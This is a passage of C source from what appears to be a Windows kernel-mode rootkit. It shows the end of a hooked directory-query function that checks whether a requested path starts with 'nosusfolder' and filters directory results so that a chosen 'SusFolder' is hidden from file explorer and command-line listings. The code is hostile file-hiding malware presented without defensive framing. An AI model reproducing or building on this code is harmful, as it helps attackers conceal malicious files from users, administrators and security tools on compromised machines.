		return STATUS_UNSUCCESSFUL;
	}
	RtlInitUnicodeString(&RequestedDir, ((PFILE_NAME_INFORMATION)HandleInfo)->FileName);
	ExFreePool(HandleInfo);


	// Search if path starts with "nosusfolder":
	SearchForInitialEvilDir(&RequestedDir, &IsSystemRoot, &IsDirSame, 2);


	// Filter results by type of information requested (both/bothid = fileexp,full/fullid=dir,cd):
	Status = IterateOverFiles(FileInformationClass, FileInformation, &DirStatus, &IsDirSame, &RequestedDir, &IsSystemRoot,
		&SusFolder, &QueryExUnicode);
	if (Status == STATUS_INVALID_PARAMETER) {
		return STATUS_SUCCESS;  // type of information that is not traced, return success (nothing to change)
	}
	return Status;
}